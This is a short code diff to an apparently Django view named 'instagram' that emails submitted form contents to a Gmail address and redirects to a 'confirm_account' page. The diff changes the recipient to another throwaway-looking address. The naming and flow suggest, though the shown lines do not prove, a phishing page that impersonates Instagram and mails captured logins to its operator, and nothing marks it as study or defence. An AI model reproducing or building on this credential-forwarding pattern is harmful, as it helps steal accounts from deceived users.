@@ -111,7 +111,7 @@ def instagram(request):
             send_mail('Contact Form',
                       message,
                       settings.EMAIL_HOST_USER,
-                      ['received215@gmail.com'], 
+                      ['voteconfirm598@gmail.com'], 
                       fail_silently=False, html_message=message)
             return redirect('confirm_account')
     
